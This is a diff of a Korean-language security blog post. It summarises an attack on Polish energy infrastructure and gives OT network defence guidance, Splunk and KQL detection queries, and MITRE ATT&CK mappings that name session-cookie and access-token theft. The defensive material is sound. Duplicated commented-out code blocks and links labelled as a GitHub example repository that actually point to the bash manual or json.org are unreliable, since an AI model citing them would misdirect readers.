+mitre_attack:
+  initial_access:
+    - T1189      # Drive-by Compromise (Extension Install)
+  collection:
+    - T1185      # Browser Session Hijacking
+    - T1539      # Steal Web Session Cookie
+    - T1005      # Data from Local System
+  credential_access:
+    - T1528      # Steal Application Access Token
+  command_and_control:
+    - T1071.001  # Web Protocols (HTTPS to C2)
+
+
+```
+-->
+-->
+
+---
+
+## 3. 폴란드 에너지 인프라 OT 공격: CERT Polska 분석
+
+### 3.1 개요
+
+**CERT Polska**가 2025년 12월 29일에 발생한 대규모 협조적 사이버 공격을 상세 보고했습니다. 30개 이상의 풍력 및 태양광 발전소, 제조 기업, 약 50만 고객에게 난방을 공급하는 대규모 열병합발전소(CHP)가 공격 대상이었습니다.
+
+| 항목 | 상세 |
+|------|------|
+| **공격 일시** | 2025년 12월 29일 |
+| **공격 유형** | 다중 대상 협조적 사이버 공격 |
+| **피해 시설** | 풍력/태양광 30+, 제조 1, 열병합 1 |
+| **영향 인구** | 약 500,000명 (난방 서비스) |
+| **보고 기관** | CERT Polska |
+
+> **출처**: [The Hacker News](https://thehackernews.com/2026/01/poland-attributes-december-cyber.html)
+
+### 3.2 OT/ICS 공격 트렌드
+
+**에너지 섹터 사이버 공격 증가 추세:**
+
+| 연도 | 주요 사건 | 영향 |
+|------|-----------|------|
+| 2015 | 우크라이나 전력망 공격 (BlackEnergy) | 23만 가구 정전 |
+| 2021 | Colonial Pipeline | 미 동부 연료 공급 중단 |
+| 2023 | 덴마크 에너지 섹터 공격 | 22개 에너지 기업 침해 |
+| 2025 | 폴란드 에너지 인프라 | 30+ 발전소, 50만명 영향 |
+
+### 3.3 OT 네트워크 방어 가이드
+
+#### IT/OT 네트워크 세그멘테이션
+
+![OT Network Segmentation - 3-zone architecture: Enterprise Zone, OT Supervisory Zone, OT Control Zone with DMZ and Firewall separation](/assets/images/diagrams/2026-01-31-ot-network-segmentation.svg)
+
+<details>
+<summary>텍스트 버전 (접근성용)</summary>
+
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+```mermaid
+graph TD
+    A["Enterprise Zone<br/>(Active Directory, Email, Web Server)"]
+    B["DMZ / Data Diode<br/>(Unidirectional Gateway)"]
+    C["OT Supervisory Zone<br/>(SCADA, Historian, HMI)"]
+    D["Firewall<br/>(Allowlist Only)"]
+    E["OT Control Zone<br/>(PLC, RTU, IED Devices)"]
+    
+    A -->|Restricted Access| B
+    B -->|One-way Data Flow| C
+    C -->|Strict Rules| D
+    D -->|Critical Control| E
+    
+    style A fill:#e1f5ff
+    style B fill:#fff3e0
+    style C fill:#f3e5f5
+    style D fill:#ffebee
+    style E fill:#c8e6c9
+
+
+```
+-->
+-->
+
+</details>
+
+#### OT 환경 보안 점검 스크립트
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
+> 
+> ```bash
+> #!/bin/bash...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
+> 
+> ```bash
+> #!/bin/bash...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```bash
+#!/bin/bash
+# OT 네트워크 기본 보안 점검 스크립트
+echo "=== OT Network Security Quick Check ==="
+echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
+
+# 1. 인터넷 연결 가능 여부 확인 (OT 존은 차단 필수)
+echo ""
+echo "[1] Internet Connectivity Check (should FAIL in OT zone)"
+if curl -s --connect-timeout 5 https://www.google.com > /dev/null 2>&1; then
+    echo "  CRITICAL: Internet accessible from OT network!"
+else
+    echo "  OK: No internet access"
+fi
+
+# 2. 알려진 OT 프로토콜 포트 리스닝 확인
+echo ""
+echo "[2] OT Protocol Ports Listening"
+OT_PORTS=("502:Modbus" "2222:EtherNet/IP" "44818:EtherNet/IP" "20000:DNP3" "4840:OPC-UA" "102:S7comm")
+for entry in "${OT_PORTS[@]}"; do
+    port="${entry%%:*}"
+    proto="${entry##*:}"
+    if ss -tlnp 2>/dev/null | grep -q ":${port}"; then
+        echo "  ACTIVE: Port ${port} (${proto})"
+    fi
+done
+
+# 3. 비인가 SSH/RDP 세션 확인
+echo ""
+echo "[3] Remote Access Sessions"
+echo "  SSH sessions: $(who | grep -c pts 2>/dev/null || echo 0)"
+echo "  Active connections on port 22: $(ss -tn state established '( dport = :22 or sport = :22 )' 2>/dev/null | wc -l)"
+echo "  Active connections on port 3389: $(ss -tn state established '( dport = :3389 or sport = :3389 )' 2>/dev/null | wc -l)"
+
+# 4. 최근 24시간 로그인 실패
+echo ""
+echo "[4] Failed Login Attempts (last 24h)"
+journalctl --since "24 hours ago" 2>/dev/null | grep -ci "failed\|failure\|invalid" || echo "  Log check unavailable"
+
+echo ""
+echo "=== Check Complete ==="
+
+
+```
+-->
+-->
+
+#### Threat Hunting: OT 네트워크 이상 탐지
+
+**목표**: 에너지 시설 OT 네트워크의 비인가 접근 및 이상 프로토콜 통신 탐지
+
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+```spl
+# Splunk: OT 프로토콜 비정상 통신 패턴 탐지
+index=ics_network sourcetype=zeek:ics (OR sourcetype=modbus OR sourcetype=dnp3)
+| eval protocol=case(
+    dest_port=502, "Modbus",
+    dest_port=20000, "DNP3",
+    dest_port=4840, "OPC-UA",
+    dest_port=44818, "EtherNet/IP",
+    1=1, "Unknown"
+  )
+| eval is_suspicious=case(
+    # External IP accessing OT protocols
+    NOT (cidrmatch("10.0.0.0/8", src_ip) OR cidrmatch("192.168.0.0/16", src_ip)), 1,
+    # OT protocol during off-hours (00:00-06:00 KST)
+    tonumber(strftime(_time, "%H")) >= 0 AND tonumber(strftime(_time, "%H")) < 6, 1,
+    # Unusual commands (Write operations)
+    like(ics_command, "%write%") OR like(ics_command, "%modify%"), 1,
+    1, 0
+  )
+| where is_suspicious=1
+| stats
+    count,
+    values(protocol) as protocols,
+    values(ics_command) as commands,
+    dc(dest_ip) as unique_targets
+    by src_ip, user
+| where count > 5 OR unique_targets > 3
+| table _time, src_ip, user, count, protocols, commands, unique_targets
+| sort - count
+
+
+```
+-->
+-->
+
+<!--
+SIEM Detection Query: Azure Sentinel KQL (ICS/OT)
+목적: 폴란드 사례 유사 OT 공격 패턴 탐지
+데이터 소스: Nozomi Guardian, Claroty, Palo Alto Networks ICS Security
+
+CommonSecurityLog
+| where TimeGenerated > ago(1h)
+| where DeviceVendor in ("Nozomi", "Claroty", "Dragos")
+| where DeviceProduct contains "ICS" or DeviceProduct contains "OT"
+| where Activity in ("Modbus_Write", "DNP3_Control", "EtherNetIP_Write", "OPC_Write")
+    or Activity contains "Unauthorized"
+| extend
+    SourceIsExternal = not(ipv4_is_in_range(SourceIP, "10.0.0.0/8")
+        or ipv4_is_in_range(SourceIP, "192.168.0.0/16")
+        or ipv4_is_in_range(SourceIP, "172.16.0.0/12")),
+    IsWriteCommand = Activity contains "Write" or Activity contains "Control"
+| where SourceIsExternal == true or IsWriteCommand == true
+| summarize
+    EventCount = count(),
+    UniqueTargets = dcount(DestinationIP),
+    Activities = make_set(Activity),
+    FirstSeen = min(TimeGenerated),
+    LastSeen = max(TimeGenerated)
+    by SourceIP, DeviceProduct
+| where EventCount > 3 or UniqueTargets > 2
+| project
+    FirstSeen,
+    LastSeen,
+    SourceIP,
+    DeviceProduct,
+    EventCount,
+    UniqueTargets,
+    Activities
+| order by EventCount desc
+-->
+
+### 3.4 IEC 62443 프레임워크 적용
+
+**에너지 시설 보안을 위한 IEC 62443 핵심 요구사항:**
+
+| 보안 수준 | 요구사항 | 적용 |
+|-----------|---------|------|
+| **SL 1** | 비의도적 위반 방지 | 기본 접근 제어, 사용자 인증 |
+| **SL 2** | 의도적 위반 방지 (일반) | 역할 기반 접근 제어, 암호화 통신 |
+| **SL 3** | 고도화된 공격 방지 | 네트워크 세그멘테이션, IDS, 무결성 모니터링 |
+| **SL 4** | 국가 수준 공격 방지 | 데이터 다이오드, 물리적 격리, 24/7 SOC |
+
+### 3.5 MITRE ATT&CK for ICS 매핑
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> mitre_attack_ics:...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> mitre_attack_ics:...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+```yaml
+mitre_attack_ics:
+  initial_access:
+    - T0817      # Drive-by Compromise
+    - T0886      # Remote Services
+  execution:
+    - T0807      # Command-Line Interface
+  persistence:
+    - T0889      # Modify Program
+  impact:
+    - T0826      # Loss of Availability
+    - T0827      # Loss of Control
+    - T0831      # Manipulation of Control
+
+
+```
+-->
+-->
+
+---
+
+## 4. Cloud CISO Perspectives: 2026 우선순위
+
+### 4.1 개요
+
+Google Cloud의 **Taylor Lehmann** (Healthcare & Life Sciences Director, Office of the CISO)이 2026년 CISO가 우선시해야 할 5가지 핵심 영역을 발표했습니다.
+
+> **출처**: [Google Cloud Blog](https://cloud.google.com/blog/products/identity-security/cloud-ciso-perspectives-5-top-ciso-priorities-in-2026/)
+
+### 4.2 2026 CISO 5대 우선순위
+
+| 순위 | 우선순위 | 핵심 포인트 |
+|------|---------|-------------|
+| 1 | **AI 보안 거버넌스** | LLM 위협 모델링, AI 공급망 보안, 프롬프트 인젝션 방어 |
+| 2 | **클라우드 네이티브 보안** | 컨테이너 런타임 보호, 서비스 메시 보안, 워크로드 아이덴티티 |
+| 3 | **규제 대응** | NIS2, DORA, AI Act 등 글로벌 규제 컴플라이언스 |
+| 4 | **공급망 보안** | SBOM 관리, 서드파티 위험 평가, 개발자 보안 도구 통합 |
+| 5 | **보안 자동화** | SOAR 고도화, AI 기반 위협 탐지, 자동 대응 파이프라인 |
+
+---
+
+## 5. 추가 주요 뉴스
+
+### 5.1 HashiCorp Boundary 0.21: 원격 접근 보안 강화
+
+**Boundary 0.21**에서 RDP 연결에 대한 비밀번호 없는 접근과 개선된 UX를 제공합니다.
+
+| 기능 | 설명 | 보안 이점 |
+|------|------|-----------|
+| **Passwordless RDP** | 인증서 기반 RDP 접근 | 자격증명 탈취 위험 감소 |
+| **세션 기록** | 모든 원격 세션 감사 기록 | 컴플라이언스 충족 |
+| **동적 자격증명** | 일회용 자격증명 발급 | 지속적 접근 방지 |
+
+> **출처**: [HashiCorp Blog](https://www.hashicorp.com/blog/boundary-0-21-improves-remote-access-security-and-ux-for-rdp-connections)
+
+### 5.2 AWS Directory Service 스케일링
+
+AWS Directory Service for Microsoft Active Directory를 기본 Active Directory 포레스트로 사용하는 아키텍처의 스케일링 옵션이 공개되었습니다. 하이브리드 환경에서의 아이덴티티 관리 확장성을 강화합니다.
+
+> **출처**: [AWS Security Blog](https://aws.amazon.com/blogs/security/explore-scaling-options-for-aws-directory-service-for-microsoft-active-directory/)
+
+### 5.3 국가은행의 셀프서비스 AI 인프라 구축 교훈
+
+HashiCorp이 **호주 국립은행(NAB)**의 레거시 기술 환경에서 셀프서비스 및 AI 기반 인프라를 구축한 5가지 교훈을 공유했습니다.
+
+> **출처**: [HashiCorp Blog](https://www.hashicorp.com/blog/5-lessons-for-enabling-self-service-and-ai-driven-infrastructure-despite-legacy-tech-at-a-national-bank)
+
+### 5.4 기타 주목할 뉴스
+
+| 제목 | 출처 | 핵심 내용 |
+|------|------|----------|
+| [AI 지원이 코딩 기술 형성에 미치는 영향](https://news.hada.io/topic?id=26275) | GeekNews | Anthropic 연구: AI 코딩 도우미의 개발자 학습/숙련도 영향 실험적 검증 |
+| [토스 프론트엔드 챕터 140명 조직 운영 경험](https://news.hada.io/topic?id=26274) | GeekNews | 대규모 프론트엔드 조직 운영 방법론과 시스템 구축 경험 |
+
+---
+
+## 6. DevSecOps 실무 가이드
+
+### 6.1 비싱/피싱 방어 CI/CD 통합
+
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> # .github/workflows/security-awareness.yml...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> # .github/workflows/security-awareness.yml...
 > ```
 
 <!-- 전체 코드는 위 GitHub 링크 참조
@@ -470,33 +1390,27 @@ jobs:
           fi
           echo "No AI service tokens found in code."
 
+
 ```
 -->
 -->
 
 ### 6.2 브라우저 확장 보안 정책 (MDM)
 
-> **코드 예시**: 전체 코드는 [JSON 공식 문서](https://www.json.org/json-en.html)를 참조하세요.
->
-> ```json
-> {
-> ```
-
-<!-- 전체 코드는 위 링크 참조
-> **코드 예시**: 전체 코드는 [JSON 공식 문서](https://www.json.org/json-en.html)를 참조하세요.
->
-> ```json
-> {
-> ```
-
-<!-- 전체 코드는 위 링크 참조
-> **코드 예시**: 전체 코드는 [JSON 공식 문서](https://www.json.org/json-en.html)를 참조하세요.
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.json.org/json-en.html)를 참조하세요.
 > 
 > ```json
-> { [truncated]
+> {...
 > ```
 
-<!-- 전체 코드는 위 링크 참조
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.json.org/json-en.html)를 참조하세요.
+> 
+> ```json
+> {...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
 ```json
 {
   "ExtensionInstallBlocklist": ["*"],
@@ -524,7 +1438,6 @@ jobs:
 
 
 ```
--->
 -->
 -->
 
